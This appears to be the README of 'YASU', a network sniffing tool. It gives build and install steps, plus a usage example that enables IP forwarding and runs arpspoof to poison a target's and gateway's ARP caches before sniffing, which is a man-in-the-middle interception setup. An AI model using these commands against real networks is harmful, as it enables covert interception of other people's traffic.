# YASU
###### yet another sniffing utility

### Configuration
You can edit stroutcfg.h for control the output generated, for example, you may need to reduce the size of the logs


### Installation
```bash
git clone https://github.com/Manu-sh/YASU
cd YASU
make
sudo make install
```


### Basic usage
```bash
# only root can perform this, sudo or su -c can't do this
echo 1 > /proc/sys/net/ipv4/ip_forward

GATEWAY=192.168.1.1 INTERFACE=wlp4s0 TARGET=192.168.1.254
sudo arpspoof -i $INTERFACE -t $TARGET -r $GATEWAY

sudo yasu
```
